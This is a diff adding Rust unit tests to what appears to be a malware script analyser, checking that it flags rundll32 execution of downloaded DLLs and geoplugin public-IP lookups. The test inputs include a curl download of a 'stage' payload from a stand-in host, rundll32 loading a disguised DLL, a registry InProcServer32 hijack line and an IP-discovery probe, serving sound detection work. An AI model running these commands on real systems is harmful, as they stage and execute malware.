@@ -25891,6 +25891,48 @@ rundll32 url.dll,FileProtocolHandler https://rundll32-launch.example/extensionle
     }
 
     #[test]
+    fn glued_rundll32_downloaded_dll_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl --output welnar.nvn https://glued-rundll32.example/stage".to_string(),
+            src: "https://glued-rundll32.example/stage".to_string(),
+            dst: Some("welnar.nvn".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("rundll32welnar.nvn,init", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { cmd, url: Some(url) }
+                        if cmd == "rundll32welnar.nvn,init"
+                            && url == "https://glued-rundll32.example/stage"
+                )
+            }),
+            "glued rundll32 downloaded DLL was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn glued_rundll32_scanner_ignores_non_execution_mentions() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"set valinf="rundll32_31152_toolbar"
+reg add HKCU\Software\Classes\CLSID\{x}\InProcServer32 /ve /d "rundll32.exe" /f
+taskkill /im rundll32.exe /f
+rundll32 C:\programdata\putty.jpg,Wind"#,
+            &mut env,
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Rundll32 { .. })),
+            "non-execution rundll32 mentions were typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn rundll32_url_exports_in_deob_text_emit_typed_traits() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -35707,6 +35749,32 @@ echo archive=W_%USERNAME%_!publicIP!.zip
                 Trait::ForUnresolvedSource { pipeline } if pipeline.contains("ipinfo.io")
             )),
             "ipinfo curl endpoint should synthesize a stable response: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn geoplugin_public_ip_lookup_emits_network_probe() {
+        let script = br#"@echo off
+for /f "tokens=1 delims=:" %%A in ('curl -# -k "http://www.geoplugin.net/php.gp?ip"') do set geo=%%A
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::NetworkProbe { probe_kind, target }
+                    if probe_kind == "ip-discovery" && target == "www.geoplugin.net"
+            )),
+            "geoplugin public-IP lookup was not typed as NetworkProbe: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.contains("www.geoplugin.net/php.gp?ip")
+            )),
+            "geoplugin public-IP curl endpoint should synthesize a stable response: {:?}",
             report.traits
         );
     }
